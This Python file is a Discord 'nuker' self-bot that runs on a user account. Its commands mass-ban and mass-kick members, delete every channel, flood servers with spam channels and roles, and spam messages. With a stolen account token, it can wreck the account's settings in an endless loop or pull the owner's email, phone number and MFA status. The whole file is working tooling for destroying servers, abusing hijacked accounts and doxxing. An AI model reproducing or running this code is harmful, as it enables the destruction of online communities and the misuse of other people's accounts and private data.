class NUKER():
    __version__ = 1.0
import subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
from discord.ext.commands.core import group
import requests
import random
import discord
from discord.ext.commands import bot
from requests.sessions import Request
import termcolor
import colorama
import webbrowser
import json
import string
import time
import aiohttp, dns.name, asyncio, functools, logging
import io
import locale
import sys
from datetime import timedelta
from sys import platform
from PIL import Image
from gtts import gTTS
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore, init


start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

token = ('TOKEN HERE')
password = ('PASSWORD HERE')
prefix = ('PREFIX HERE')


Ercy = commands.Bot(command_prefix=prefix, self_bot=True)
Ercy.remove_command('help')

os.system('cls')
print(f'{Fore.RED}STARTING UP NUKER ...')



@Ercy.event
async def on_connect():
    os.system('cls')
    print(f'''{Fore.RED}

▓█████  ██▀███   ▄████▄▓██   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█ ▒██  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▒██ ██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒░ ▐██▓░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▒░██▓ ▒██▒▒ ▓███▀ ░░ ██▒▓░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░ ██▒▒▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ░  ░  ░▒ ░ ▒░  ░  ▒  ▓██ ░▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░     ░░   ░ ░       ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
   ░  ░   ░     ░ ░     ░ ░                 ░    ░     ░  ░      ░  ░   ░     
                ░       ░ ░                                                   
        

                                
    ''')
    print(f'{Fore.RED}                      SKIDS L')
    print(f'{Fore.RED}                      NUKER VERSION {NUKER.__version__}')
    print(f'{Fore.RED}                      Logged in as: {Ercy.user.name}#{Ercy.user.discriminator}')
    print(f'{Fore.RED}                      Prefix {prefix}')
    print('')


languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

@Ercy.command()   
async def help(ctx):
  
    embed = discord.Embed(title=" ERCY 𝘕𝘜𝘒𝘌𝘙 ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/igeym1fkURH9MOBeL7j4BknrrAY-vqNOHu-GmSCuTnY/%3Fwidth%3D399%26height%3D498/https/images-ext-1.discordapp.net/external/LiqD2u87felzje6soAEMITlLphw-AHieNl0e_LMjFQs/%253Fwidth%253D448%2526height%253D560/https/media.discordapp.net/attachments/697225400505598044/758668702827937812/ezgif.com-optimize.gif")
    embed.add_field(name=prefix+"**versace**", value="`Nukes the server`.\n", inline=False)
    embed.add_field(name=prefix+"**ban**", value="`Mass Ban`\n", inline=False)
    embed.add_field(name=prefix+"**kick**", value="`Mass Kick`\n", inline=False)  
    embed.add_field(name=prefix+"**channel**", value="`Channels`\n", inline=False)
    embed.add_field(name=prefix+"**zoom**", value="`Deletes everything`\n", inline=False)
    embed.add_field(name=prefix+"**strean**", value="`Streams`\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://media.discordapp.net/attachments/729479996707438602/761636264466186250/image0.gif")
    await ctx.send(embed=embed)
@Ercy.command()
async def ercy(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}Nuking the server")
    for users in ctx.guild.members:
        try:
            await users.ban()
            print(f"{Fore.RED}Banned")
        except:
            print(f"{Fore.RED}Failed To Ban")
            print(f"{Fore.RED}Ercy Block ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.RED}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'Ercy Block {i}')
            await ctx.guild.create_voice_channel(name=f'Ercy Block {i}')
            await ctx.guild.create_category(name=f'Ercy Block {i}')
            print(f"{Fore.RED}Added {channel.name}")
  
@Ercy.command()
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send("`Enabling ban sequence `")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/745459720302886922/748256364463259768/image0-155.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")

@Ercy.command()
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("`Ercy Block `")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/745459720302886922/748256364463259768/image0-155.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")


@Ercy.command()
async def channels(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'ERCY HOED YOU ')
    print(f"{Fore.RED}Added {channel.name}")

@Ercy.command()
async def zoom(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED}Deleting Channels . . .")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED} Channels Deleted")

@Ercy.command()
async def stream(ctx, *, message): 
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/ercy", 
    )
    await Ercy.change_presence(activity=stream)

@Ercy.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def group(ctx): 
    await ctx.message.delete()
    for channel in Danger.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()       

            
@Ercy.command()
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Ercy.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass
       
@Ercy.command()
async def uptime(ctx): 
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@Ercy.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send('Pong!')

@Ercy.command()
async def spam(ctx, amount: int, *, message): 
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@Ercy.command()
async def massrole(ctx): 
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@Ercy.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

@Ercy.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': "Ercy Block",
        'icon': "https://cdn.discordapp.com/attachments/745459720302886922/748256364463259768/image0-155.gif",
        'name': "13ercy was here#1337",
        'region': "india"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}INVALID{Fore.RED}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}INVALID{Fore.RED}{e}"+Fore.RESET)
            else:
                break   
           
@Ercy.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}Something is wrong ==> {Fore.RED}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@Ercy.command()
async def unbanll(ctx):
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

Ercy.run('TOKEN HERE AGAIN', bot=False)
